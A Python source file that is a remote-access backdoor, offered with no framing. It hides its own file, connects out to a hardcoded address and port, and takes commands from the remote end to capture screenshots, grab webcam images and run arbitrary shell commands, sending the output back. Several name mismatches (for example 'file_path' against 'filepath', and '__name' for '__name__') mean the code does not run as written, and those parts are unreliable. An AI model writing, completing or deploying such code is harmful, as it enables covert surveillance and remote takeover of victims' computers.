import os
import subprocess
import sys
import socket
import threading
import cv2
import numpy as np
import pyautogui
import struct

def hidefile(filename):
    subprocess.run(['attrib', '+h', filename], check=True)

def hideself():
    filepath = sys.argv[0]
    hidefile(file_path)

def take_screenshot():
    screen = pyautogui.screenshot()
    img_data = cv2.imencode('.jpg', np.array(screen))[1].tobytes()
    return img_data

def access_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if ret:
        img_data = cv2.imencode('.jpg', frame)[1].tobytes()
        return img_data
    return None

def send_data(sock, data):
    sock.sendall(struct.pack(">L", len(data)) + data)

def execute_system_command(command):
    try:
        output = subprocess.getoutput(command)
        return output.encode('utf-8')
    except Exception as e:
        return str(e).encode('utf-8')

def setup_backdoor(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        s.send(b"Connection established.")
    except Exception as e:
        print(f"Failed to connect: {e}")
        return

    try:
        while True:
            command = s.recv(1024).decode("utf-8").strip()
            if command == "screenshot":
                img_data = take_screenshot()
                send_data(s, img_data)
            elif command == "webcam":
                img_data = access_webcam()
                send_data(s, img_data)
            elif command == "exit":
                break
            else:
                output = execute_system_command(command)
                s.sendall(output if output else b"Command executed with no output.")
    finally:
        s.close()

if __name == "__main__":
    hide_self()
    threading.Thread(target=setup_backdoor, args=("192.168.124.139", 9999)).start()